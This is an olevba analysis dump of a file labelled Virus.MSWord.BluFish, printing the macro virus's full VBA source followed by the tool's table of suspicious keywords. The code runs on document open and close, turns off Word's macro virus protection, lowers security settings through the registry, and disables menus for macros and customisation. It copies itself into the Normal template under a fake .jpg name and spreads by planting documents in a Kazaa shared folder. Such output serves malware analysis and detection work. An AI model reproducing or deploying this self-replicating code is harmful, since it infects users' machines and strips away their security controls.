olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.BluFish
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.BluFish - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Call BluFish
End Sub
Sub AutoOpen()
Call BluFish
End Sub
Sub ViewVBCode()
Call BluFish
End Sub
Sub BluFish()
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Options.VirusProtection = False: Options.ConfirmConversions = False: Options.SaveNormalPrompt = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Word\Security", "AccessVBOM") = 1&
If CommandBars("Tools").Controls("Macro").Enabled = True Then CommandBars("Tools").Controls("Macro").Enabled = False
If CommandBars("Macro").Controls("Security...").Enabled = True Then CommandBars("Macro").Controls("Security...").Enabled = False
If CommandBars("Macro").Controls("Macros...").Enabled = True Then CommandBars("Macro").Controls("Macros...").Enabled = False
If CommandBars("Tools").Controls("Customize...").Enabled = True Then CommandBars("Tools").Controls("Customize...").Enabled = False
If CommandBars("View").Controls("Toolbars").Enabled = True Then CommandBars("View").Controls("Toolbars").Enabled = False
If ActiveDocument.VBProject.VBComponents.Item("BluFish").Name = "BluFish" Then ActiveDocument.VBProject.VBComponents.Item("BluFish").Export fso.GetSpecialFolder(2) & "\Blfsh32[1].jpg"
If Not NormalTemplate.VBProject.VBComponents.Item("BluFish").Name = "BluFish" Then NormalTemplate.VBProject.VBComponents.Import fso.GetSpecialFolder(2) & "\Blfsh32[1].jpg"
If Not ActiveDocument.VBProject.VBComponents.Item("BluFish").Name = "BluFish" Then ActiveDocument.VBProject.VBComponents.Import fso.GetSpecialFolder(2) & "\Blfsh32[1].jpg"
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Kazaa\Transfer", "DlDir0") <> "" Then
MkDir fso.GetSpecialFolder(1) & "\FileServ"
If (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=fso.GetSpecialFolder(1) & "\FileServ\" & ActiveDocument.Name
ActiveDocument.Saved = True
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Kazaa\Transfer", "DlDir1") = fso.GetSpecialFolder(1) & "\FileServ"
End If
If (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If (InStr(1, ActiveDocument.Name, "Document") = True) Then ActiveDocument.Saved = True
' BluFish by Zed
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

